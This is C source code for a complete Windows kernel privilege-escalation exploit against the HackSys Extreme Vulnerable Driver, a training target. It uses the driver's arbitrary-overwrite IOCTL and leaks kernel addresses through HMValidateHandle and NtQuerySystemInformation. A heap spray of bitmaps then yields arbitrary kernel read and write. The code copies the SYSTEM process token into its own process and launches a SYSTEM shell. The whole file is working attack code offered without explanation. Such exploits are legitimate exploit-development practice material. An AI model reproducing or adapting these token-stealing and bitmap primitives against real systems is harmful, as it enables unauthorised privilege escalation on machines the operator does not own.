#include <Windows.h>
#include <Psapi.h>
#include <stdio.h>

#define DEVICE_NAME L"\\\\.\\HackSysExtremeVulnerableDriver"
#define HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE 0x22200B

typedef void* (NTAPI* lHMValidateHandle)(HWND h, int type);

typedef NTSTATUS(NTAPI* PNtQuerySystemInformation)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);

typedef NTSTATUS(NTAPI* PNtQueryIntervalProfile)(
	DWORD ProfileSource,
	PULONG Interval
	);
typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation = 0,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemProcessInformation = 5,
	SystemProcessorPerformanceInformation = 8,
	SystemModuleInformation = 11,
	SystemInterruptInformation = 23,
	SystemExceptionInformation = 33,
	SystemRegistryQuotaInformation = 37,
	SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;

#define MAXIMUM_FILENAME_LENGTH 255 

typedef struct SYSTEM_MODULE {
	ULONG64              Reserved1;
	ULONG64              Reserved2;
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	WORD                 Id;
	WORD                 Rank;
	WORD                 w018;
	WORD                 NameOffset;
	BYTE                 Name[MAXIMUM_FILENAME_LENGTH];
}SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef struct _WRITE_WHAT_WHERE {
	PULONG_PTR What;
	PULONG_PTR Where;
}WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;


typedef struct _HBITMAPEX{
	HBITMAP handle;
	ULONG64 pvScan0;
}HBITMAPEX, * PHBITMAPEX;

HBITMAPEX hManagerBitmapEx;
HBITMAPEX hWorkerBitmapEx;

ULONG64 ntoskrnlBase;

PSYSTEM_MODULE GetNtoskrnlInfo()
{
	HMODULE ntdll = GetModuleHandle(L"ntdll");
	if (ntdll == NULL) {
		printf("[-] Failed to get handle to ntdll.dll.\n");
		exit(-1);
	}

	PNtQuerySystemInformation _NtQuerySystemInformation =
		(PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
	if (_NtQuerySystemInformation == NULL) {
		printf("[-] Failed to get address of NtQuerySystemInformation.\n");
		exit(-1);
	}

	ULONG retLength;
	_NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &retLength);
	PSYSTEM_MODULE_INFORMATION ModuleInfo =
		(PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, retLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!ModuleInfo) {
		printf("[-] Failed to allocate memory for ModuleInfo.\n");
		exit(-1);
	}

	_NtQuerySystemInformation(SystemModuleInformation, ModuleInfo, retLength, &retLength);
	return &ModuleInfo->Modules[0];
}

ULONG64 GetHalDispatchTableAddr(char* fullName)
{
	char* krnlName = strrchr(fullName, '\\') + 1;
	DWORD dBufSize = MultiByteToWideChar(CP_ACP, 0, krnlName, (int)strlen(krnlName), NULL, 0);
	WCHAR* dBuf = (WCHAR*)malloc(sizeof(WCHAR) * ((size_t)dBufSize + 1));
	int iRet = MultiByteToWideChar(CP_ACP, 0, krnlName, (int)strlen(krnlName) + 1, dBuf, dBufSize + 1);
	if (iRet <= 0 || dBuf == NULL) {
		printf("[-] Failed to convert char to wchar.\n");
		exit(-1);
	}

	HMODULE ntoskrnlUser = LoadLibraryEx(dBuf, NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (ntoskrnlUser == NULL) {
		printf("[-] Failed to load kernel image.\n");
		exit(-1);
	}
	printf("[+] Loaded kernel in usermode using LoadLibraryEx: %p.\n", ntoskrnlUser);

	ULONG64 userHalDispatchTable = (ULONG64)GetProcAddress(ntoskrnlUser, "HalDispatchTable");
	if (userHalDispatchTable == 0) {
		printf("[+] Failed to locate HalDispatchTable");
	}
	ULONG64 offHalDispatchTable = userHalDispatchTable - (ULONG64)ntoskrnlUser;
	ULONG64 addrHalDispatchTable = offHalDispatchTable + ntoskrnlBase;
	printf("[+] Found address to HalDispatchTable at 0x%llx.\n", addrHalDispatchTable);

	return addrHalDispatchTable;
}

HANDLE GetDeviceHandle()
{
	HANDLE hRet = NULL;
	hRet = CreateFile(
		DEVICE_NAME,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL
	);

	if (hRet == INVALID_HANDLE_VALUE) {
		printf("Error open device with error code: %d\n", GetLastError());
		exit(-1);
	}

	return hRet;
}

lHMValidateHandle LocateHMValidateHandle()
{
	HMODULE hUser32 = LoadLibrary(L"user32.dll");
	if (hUser32 == NULL) {
		printf("[-] Failed to load user32.\n");
		return NULL;
	}

	BYTE* pIsMenu = (BYTE*)GetProcAddress(hUser32, "IsMenu");
	if (pIsMenu == NULL) {
		printf("[-] Failed to find location of function 'IsMenu'.\n");
		return NULL;
	}
	UINT32 uiHMValidateHandleOffset = 0;
	for (UINT32 i = 0; i < 0x1000; ++i) {
		BYTE* test = pIsMenu + i;
		if (*test == 0xE8) {
			uiHMValidateHandleOffset = i + 1;
			break;
		}
	}
	if (uiHMValidateHandleOffset == 0) {
		printf("[-] Failed to find offset of HMValidateHandle.\n");
		return NULL;
	}

	UINT32 relaCallOffset = *(UINT32*)(pIsMenu + uiHMValidateHandleOffset);                                 // 4bytes relative call offset
	UINT32 pHMValidateHandle32 = (UINT32)pIsMenu + uiHMValidateHandleOffset + 4 + relaCallOffset;          // low 4 bytes address

	lHMValidateHandle pHMValidateHandle = (lHMValidateHandle)(pHMValidateHandle32 | ((UINT64)pIsMenu & (~0xfffffff)));      // add high 4 bytes
	printf("[+] HMValidateHandle address: %p.\n", pHMValidateHandle);

	return pHMValidateHandle;
}

ULONG64 GetNtoskrnlBase()
{
	LPVOID addresses[1000];
	DWORD needed;

	EnumDeviceDrivers(addresses, 1000, &needed);

	return (ULONG64)addresses[0];
}

VOID HEVDArbitraryOverwrite(PWRITE_WHAT_WHERE pWWW)
{
	HANDLE driver = GetDeviceHandle();
	if (driver == NULL) {
		printf("[-] Failed open handle to driver.\n");
		exit(-1);
	}
	printf("[+] Opened handle to driver: %p.\n", driver);

	DWORD retBytes;
	if (DeviceIoControl(
		driver,
		HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE,
		pWWW,
		sizeof(WRITE_WHAT_WHERE),
		NULL,
		0,
		&retBytes,
		NULL
	)) {
		printf("[+] Sent buffer to driver.\n");
	}
	else {
		printf("[-] Failed to send buffer to driver.\n");
		exit(-1);
	}
}

UINT64 CalculateulClientDelta()
{
	UINT64 tebBase = (UINT64)NtCurrentTeb();
	UINT64 userKernelDesktopHeap = *(UINT64*)(tebBase + 0x828);
	UINT64 kernelDesktopHeap = *(UINT64*)(userKernelDesktopHeap + 0x28);
	UINT64 ulClientDelta = kernelDesktopHeap - userKernelDesktopHeap;

	return ulClientDelta;
}

UINT64 GetlpszMenuNameAddr(HWND h)
{
	lHMValidateHandle pHMValidateHandle = LocateHMValidateHandle();
	printf("[+] HMValidateHandle function: %p.\n", pHMValidateHandle);
	if (pHMValidateHandle == NULL) {
		printf("[-] Failed to locate HMValidateHandle function.\n");
		exit(-1);
	}

	UINT64 ulClientDelta = CalculateulClientDelta();
	printf("[+] ulClientDelta: %llx.\n", ulClientDelta);

	UINT64 wndAddr = (UINT64)pHMValidateHandle(h, 1);
	UINT64 kernelTagCls = *(PUINT64)(wndAddr + 0xA8);
	UINT64 lpszNameAddr = *(PUINT64)(kernelTagCls - ulClientDelta + 0x90);

	return lpszNameAddr;
}

HBITMAPEX GetMalCreateBitmap()
{
	HBITMAPEX hBitmapEx = { 0 };
	/*
	* Heap spray
	*/
	UINT64 prev = -1, cur = 0;
	for (int i = 0; i < 0x100; ++i) {
		char buf[0x8f0];                                               // The size is just copy from reference
		memset(buf, 0x41, 0x8f0);
		WNDCLASSEXA wnd = { 0 };
		wnd.cbSize = sizeof(wnd);
		wnd.lpszClassName = TEXT("case");
		wnd.lpszMenuName = buf;
		wnd.lpfnWndProc = DefWindowProc;
		
		int result = RegisterClassExA(&wnd);
		if (!result) {
			printf("[-] RegisterClassEx error: %d.\n", GetLastError());
			return hBitmapEx;
		}

		HWND t = CreateWindowExA(
			0,
			wnd.lpszClassName,
			TEXT("WORDS"),
			0,
			CW_USEDEFAULT,
			CW_USEDEFAULT,
			CW_USEDEFAULT,
			CW_USEDEFAULT,
			NULL, NULL, NULL, NULL);
		cur = GetlpszMenuNameAddr(t);

		if (cur == prev) {
			DestroyWindow(t);
			UnregisterClassA(wnd.lpszClassName, NULL);
			hBitmapEx.handle = CreateBitmap(0x701, 0x2, 0x1, 0x8, NULL);  // The size is just copy from reference
			break;
		}

		DestroyWindow(t);
		UnregisterClassA(wnd.lpszClassName, NULL);
		prev = cur;
	}
	hBitmapEx.pvScan0 = cur + 0x50;
	return hBitmapEx;
}

VOID PrepareBitmapArbitraryReadWrite()
{
	
	hManagerBitmapEx = GetMalCreateBitmap();
	hWorkerBitmapEx = GetMalCreateBitmap();
	if (hManagerBitmapEx.handle == NULL) {
		printf("failed to get handle.\n");
		exit(-1);
	}

	UINT64 pManagerpvScan0 = hManagerBitmapEx.pvScan0;
	UINT64 pWorkerpvScan0 = hWorkerBitmapEx.pvScan0;

	WRITE_WHAT_WHERE www = { 0 };
	www.Where = (PULONG_PTR)pManagerpvScan0;
	www.What = &pWorkerpvScan0;

	HEVDArbitraryOverwrite(&www);
	printf("[+] Ready to arbitrary read and write via bitmap.\n");
}

VOID ArbitraryRead(ULONG64 where, LPVOID what, int len)
{
	SetBitmapBits(hManagerBitmapEx.handle, len, &where);
	GetBitmapBits(hWorkerBitmapEx.handle, len, what);
}

VOID ArbitraryWrite(ULONG64 where, LPVOID what, int len)
{
	SetBitmapBits(hManagerBitmapEx.handle, len, &where);
	SetBitmapBits(hWorkerBitmapEx.handle, len, what);
}

BOOL StealToken()
{
	HMODULE ntdll = GetModuleHandle(L"ntdll");
	if (ntdll == NULL) {
		printf("[-] Failed to get handle of ntdll.\n");
		exit(-1);
	}

	PNtQuerySystemInformation NtQuerySystemInformation = (PNtQuerySystemInformation)
		GetProcAddress(ntdll, "NtQuerySystemInformation");
	if (NtQuerySystemInformation == NULL) {
		printf("[-] Failed to get NtQuerySystemInformation.\n");
		return FALSE;
	}

	DWORD len;
	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);

	PSYSTEM_MODULE_INFORMATION moduleInfo = NULL;
	moduleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (moduleInfo == NULL) {
		printf("[-] Failed to VirtualAlloc memory.\n");
		return FALSE;
	}

	NtQuerySystemInformation(SystemModuleInformation, moduleInfo, len, &len);

	UINT64 kernelBase = (UINT64)moduleInfo->Modules[0].ImageBaseAddress;
	printf("[+] Kernel base: %llx.\n", kernelBase);

	PCHAR kernelImage = moduleInfo->Modules[0].Name;
	PCHAR kernelName = kernelImage + moduleInfo->Modules[0].NameOffset;
	printf("[+] Kernel name: %s.\n", kernelName);

	HMODULE hUserSpaceKernel = LoadLibraryExA(kernelName, 0, 0);
	if (hUserSpaceKernel == NULL) {
		printf("[-] Failed to load kernel in user space.\n");
		VirtualFree(moduleInfo, 0, MEM_RELEASE);
		return FALSE;
	}

	FARPROC pUserPsInitialSystemProcess = GetProcAddress(hUserSpaceKernel, "PsInitialSystemProcess");
	if (pUserPsInitialSystemProcess == NULL) {
		printf("[-] Failed to locate PsInitialSystemProcess.\n");
		return FALSE;
	}
	FARPROC pPsInitialSystemProcess = (FARPROC)((UINT64)pUserPsInitialSystemProcess - (UINT64)hUserSpaceKernel + (UINT64)kernelBase);
	
	FreeLibrary(hUserSpaceKernel);
	VirtualFree(moduleInfo, 0, MEM_RELEASE);
	
	LPVOID lpSystemEPROCESS = NULL;
	LPVOID lpSysProcID = NULL;
	LPVOID lpSystemToken = NULL;
	LIST_ENTRY lpNextEntryAddress;
	ArbitraryRead((ULONG64)pPsInitialSystemProcess, &lpSystemEPROCESS, sizeof(LPVOID));
	ArbitraryRead((ULONG64)lpSystemEPROCESS + 0x2E8, &lpSysProcID, sizeof(LPVOID));
	ArbitraryRead((ULONG64)lpSystemEPROCESS + 0x358, &lpSystemToken, sizeof(LPVOID));
	ArbitraryRead((ULONG64)lpSystemEPROCESS + 0x2f0, &lpNextEntryAddress, sizeof(LIST_ENTRY));

	printf("[+] System process address is: 0x%p\n", lpSystemEPROCESS);
	printf("[+] Next Process AT: 0x%p\n", lpNextEntryAddress.Flink);
	printf("[+] System process token value is: 0x%p\n", lpSystemToken);
	printf("[+] System process PID is: 0x%p\n", lpSysProcID);

	UINT64 currentProcessId = GetCurrentProcessId();

	LPVOID lpNextEPROCESS = NULL;
	UINT64 currentPID = 0;
	LPVOID lpCurrentToken = NULL;
	do {
		lpNextEPROCESS = (LPVOID)((UINT64)lpNextEntryAddress.Flink - 0x2E8);
		ArbitraryRead((ULONG64)lpNextEPROCESS + 0x2E0, &currentPID, sizeof(LPVOID));
		ArbitraryRead((ULONG64)lpNextEPROCESS + 0x2E8, &lpNextEntryAddress, sizeof(LIST_ENTRY));
	} while (currentPID != currentProcessId);

	UINT64 currentProcessTokenAddr = (UINT64)lpNextEPROCESS + 0x358;
	ArbitraryWrite(currentProcessTokenAddr, (PULONG64)&lpSystemToken, sizeof(LPVOID));

	return TRUE;
}

int main()
{
	SYSTEM_MODULE krnlInfo = *GetNtoskrnlInfo();
	ntoskrnlBase = (ULONG64)krnlInfo.ImageBaseAddress;
	printf("[+] ntoskrnl.exe base address: 0x%llx.\n", ntoskrnlBase);

	ULONG64 addrHalDispatchTable = GetHalDispatchTableAddr((char*)krnlInfo.Name);
	printf("[+] HalDispatchTable addr: %llx.\n", addrHalDispatchTable);

	PrepareBitmapArbitraryReadWrite();

	StealToken();
	printf("[+] Elevation of Priviledge success!.\n");

	system("cmd.exe");

	return 0;
}